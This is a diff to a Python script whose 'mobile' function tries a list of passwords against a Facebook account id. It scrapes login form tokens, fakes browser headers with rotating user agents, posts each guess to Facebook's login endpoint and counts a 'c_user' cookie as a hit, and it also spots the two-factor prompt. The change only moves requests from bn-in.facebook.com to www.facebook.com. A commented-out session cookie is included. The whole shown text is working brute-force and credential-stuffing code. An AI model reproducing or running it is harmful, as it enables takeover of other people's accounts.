@@ -1595,7 +1595,7 @@ def mobile(uid,pwx,tl):
         for pw in pwx:
             ua = random.choice(uas)
             Session = requests.Session()
-            free_fb = Session.get('https://bn-in.facebook.com/').text
+            free_fb = Session.get('https://www.facebook.com/').text
             data = {
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -1626,9 +1626,9 @@ def mobile(uid,pwx,tl):
             'content-type': 'application/x-www-form-urlencoded',
             # 'cookie': 'sb=rp_6ZrdRV1vg1JSQt-kGL7oZ; datr=rp_6ZvkONbQIhMeMcdrNQlTW; ps_l=1; ps_n=1; usida=eyJ2ZXIiOjEsImlkIjoiQXNrc2ZiMWswbWo1cSIsInRpbWUiOjE3Mjc5NzE5OTF9; fr=1TtcqI6vgDuofxZxz.AWWCSCcKKy9RlBXSkVbbIrK94zU.BmvaYd..AAA.0.0.Bm_sND.AWUgSRwe2Tw; wd=1051x773',
             'dpr': '1',
-            'origin': 'https://bn-in.facebook.com',
+            'origin': 'https://www.facebook.com',
             'priority': 'u=0, i',
-            'referer': 'https://bn-in.facebook.com/login/device-based/regular/login/?',
+            'referer': 'https://www.facebook.com/login/device-based/regular/login/?',
             'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
             'sec-ch-ua-full-version-list': '"Google Chrome";v="129.0.6668.72", "Not=A?Brand";v="8.0.0.0", "Chromium";v="129.0.6668.72"',
@@ -1644,7 +1644,7 @@ def mobile(uid,pwx,tl):
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
             'viewport-width': '1051',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://bn-in.facebook.com/login/device-based/regular/login/"
+            url = "https://www.facebook.com/login/device-based/regular/login/"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
